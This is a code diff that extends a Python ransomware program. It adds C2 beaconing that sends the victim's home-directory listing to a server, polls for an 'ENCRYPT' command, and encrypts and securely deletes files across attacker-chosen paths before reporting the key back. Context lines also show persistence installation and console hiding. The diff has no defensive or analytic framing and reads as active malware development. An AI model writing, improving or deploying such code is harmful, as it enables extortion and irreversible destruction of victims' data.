@@ -37,6 +37,53 @@ FQIDAQAB
 
 C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere
 
+def scan_and_wait_for_instructions():
+    """
+    1. Scans top-level directories.
+    2. Sends them to C2.
+    3. Loops until C2 sends back a target list.
+    """
+    # 1. SCAN: Get top-level folders in Home
+    home = os.path.expanduser("~")
+    dirs = []
+    try:
+        for entry in os.scandir(home):
+            if entry.is_dir() and not entry.name.startswith('.'):
+                dirs.append(entry.path)
+    except: pass
+
+    # 2. BEACON: Generate a temporary ID and send file list
+    temp_id = base64.urlsafe_b64encode(os.urandom(6)).decode().rstrip('=')
+    print(f"[*] Victim {temp_id} online. Sending file list to C2...")
+    
+    payload = {
+        "id": temp_id,
+        "type": "RECON",
+        "files": dirs
+    }
+    
+    # Send Scan Results
+    try:
+        requests.post(f"{C2_SERVER_URL}/api/recon", json=payload, timeout=5)
+    except:
+        return None # Fail silently if C2 is down
+
+    # 3. WAIT: Poll C2 every 5 seconds for a command
+    print("[*] Waiting for Attacker command...")
+    while True:
+        try:
+            # Poll the "Task" endpoint
+            resp = requests.get(f"{C2_SERVER_URL}/api/task/{temp_id}", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                if data.get("action") == "ENCRYPT":
+                    target_list = data.get("targets")
+                    print(f"[!] Command Received: Encrypt {len(target_list)} targets.")
+                    return target_list
+        except:
+            pass
+        time.sleep(5)
+
 # --- PATH CONFIGURATION ---
 def get_paths():
     """Determines stable paths for config and target data."""
@@ -218,18 +265,21 @@ def log_error(message):
         pass 
 
 # --- Ransomware Logic ---
-def encrypt_directory():
-    if not os.path.exists(TARGET_DIRECTORY):
-        try: os.makedirs(TARGET_DIRECTORY)
-        except: pass
+def encrypt_directory(target_list=None):
+    # FIX 1: If no list provided (offline mode), fall back to default target
+    if target_list is None:
+        target_list = [TARGET_DIRECTORY]
+        if not os.path.exists(TARGET_DIRECTORY):
+            try: os.makedirs(TARGET_DIRECTORY)
+            except: pass
 
+    # Check for previous crash
     if os.path.exists(KEY_BACKUP_FILE):
         log_error("Found key backup. Resuming from crash...")
         try:
             with open(KEY_BACKUP_FILE, 'rb') as f:
                 return f.read()
-        except:
-            pass 
+        except: pass 
 
     if os.path.exists(LOCK_FILE):
         log_error("Encryption seemingly complete (Lock file exists).")
@@ -244,15 +294,21 @@ def encrypt_directory():
         log_error(f"Failed to write key backup: {e}")
 
     encrypted_files = 0
-    # ONLY WALK TARGET_DIRECTORY
-    if os.path.exists(TARGET_DIRECTORY):
-        for root, _, files in os.walk(TARGET_DIRECTORY):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
-                    if encrypt_file_aes_gcm(file_path, aes_key):
-                        secure_delete_file(file_path)
-                        encrypted_files += 1
+    
+    # FIX 2: Iterate over the LIST of targets, not just the single TARGET_DIRECTORY
+    print(f"[*] Starting encryption on {len(target_list)} paths...")
+    
+    for target_path in target_list:
+        if os.path.exists(target_path):
+            for root, _, files in os.walk(target_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    # Check extension and skip already encrypted
+                    if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
+                        if encrypt_file_aes_gcm(file_path, aes_key):
+                            secure_delete_file(file_path)
+                            encrypted_files += 1
+                            print(f"    [LOCKED] {file}")
 
     with open(LOCK_FILE, 'w') as f:
         f.write("Encryption complete.")
@@ -635,6 +691,18 @@ if __name__ == "__main__":
     install_persistence()
 
     hide_console()
+
+    # 1. WAIT FOR COMMAND
+    selected_targets = scan_and_wait_for_instructions()
+    
+    # 2. EXECUTE IF TARGETS RECEIVED
+    if selected_targets:
+        aes_key = encrypt_directory(selected_targets)
+        
+        # 3. FINAL CHECK-IN (Send Key)
+        if aes_key:
+            check_in_with_c2(aes_key)
+            # ... Launch GUI ...
 
     # PERSISTENCE CHECK-IN
     # Check ID file in stable CONFIG_DIR
